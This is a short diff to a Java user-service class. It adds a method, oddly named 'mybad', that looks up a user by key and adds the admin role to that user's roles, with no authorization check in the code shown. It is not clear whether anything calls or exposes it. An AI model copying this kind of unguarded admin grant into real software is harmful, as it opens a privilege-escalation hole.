@@ -146,6 +146,18 @@ public class UserServiceImp implements UserService {
         return "Wystąpił błąd serwisu";
     }
 
+    @Override
+    public void mybad(String key) {
+        Optional<User> optionalUser = userRepository.findByUserKey(key);
+        if(optionalUser.isPresent()){
+            User user = optionalUser.get();
+            Set<Role> roles=user.getRoleSet();
+            roles.add(roleRepository.findByRoleName(ERole.ROLE_ADMIN).get());
+            user.setRoleSet(roles);
+            userRepository.save(user);
+        }
+    }
+
 
     //test
     public Set<User> test(){
